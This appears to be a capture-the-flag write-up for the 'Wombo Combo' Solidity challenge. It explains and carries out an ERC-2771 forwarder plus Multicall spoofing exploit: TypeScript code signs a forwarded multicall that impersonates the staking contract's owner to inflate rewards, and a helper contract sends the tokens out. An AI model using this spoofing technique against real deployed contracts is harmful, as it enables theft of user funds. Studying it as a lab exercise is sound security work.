## Wombo Combo

### description

You should stake your tokens to get more tokens!

### goal

We may find the goal of this challenge in the [Challenge](./challenge/project/src/Challenge.sol) contract.

```solidity
function isSolved() external view returns (bool) {
    uint256 amazingNumber = 1128120030438127299645800;
    return staking.earnedTotal() >= amazingNumber &&
        staking.rewardsToken().balanceOf(address(0x123)) >= amazingNumber;
}
```

### solution

This challenge is related to the vulnerability when both `Multicall` and `ERC-2711` are implemented.

[Unveiling the ERC-2771 Context and Multicall Vulnerability](https://blog.solidityscan.com/unveiling-the-erc-2771context-and-multicall-vulnerability-f96ffa5b499f)

We may craft spoofed calls to `multicall(bytes[])` and modify the reward in `Staking` contract.

Before attacking the contract, we may first `approve` and `deposit` our `stakingToken` to the `Staking` contract.

```typescript
const stakingToken = await stakingContract.stakingToken();
const stakingTokenContract = await ethers.getContractAt("Token", stakingToken);
const stBalance = await stakingTokenContract.balanceOf(signer);

const approveTx = await stakingTokenContract.approve(stakingAddr, stBalance);
await approveTx.wait();

const stakeTx = await stakingContract.connect(signer).stake(stBalance);
await stakeTx.wait();
```

Next, we may wrap our spoofed calls and modify the reward.

```typescript
const types = {
  ForwardRequest: [
    { name: "from", type: "address" },
    { name: "to", type: "address" },
    { name: "value", type: "uint256" },
    { name: "gas", type: "uint256" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
    { name: "data", type: "bytes" },
  ],
};

const domain = {
  name: "Forwarder",
  version: "1",
  chainId: await ethers.provider
    .getNetwork()
    .then((network) => network.chainId),
  verifyingContract: fwderAddr,
};

const victim = await stakingContract.owner();
const data = {
  from: signer.address,
  to: stakingAddr,
  value: 0n,
  gas: 10_00_000n,
  nonce: nonce,
  data: stakingContract.interface.encodeFunctionData("multicall", [
    [
      // since the duration is 60
      ethers.concat([
        stakingContract.interface.encodeFunctionData("notifyRewardAmount", [
          amazingNumber * 60n,
        ]),
        victim,
      ]),
    ],
  ]),
  deadline: 99999999999999n,
};

const sign = await signer.signTypedData(domain, types, data);
const attackTx = await fwderContract.connect(signer).execute(data, sign);
await attackTx.wait();
```

Next, we may get our rewards and fullfil the first condition of this challenge

```typescript
const getRtTx = await stakingContract.connect(signer).getReward();
await getRtTx.wait();

const earnTotoal = await stakingContract.earnedTotal();
if (earnTotoal < amazingNumber) {
  console.log("Insufficient earnTotal.");
}
```

Finally, we need to send the rewardToken to `address(0x123)`.
I am not sure how to do this with `ethers.js`, so I just do this using a `Sender` contract.

```solidity
contract Sender {
    Token public rewardToken;

    constructor(address _token){
        rewardToken = Token(_token);
    }

    function pwn() external {
        uint256 amazingNumber = 1128120030438127299645800;
        rewardToken.transferFrom(msg.sender, address(0x123), amazingNumber);
    }
}
```
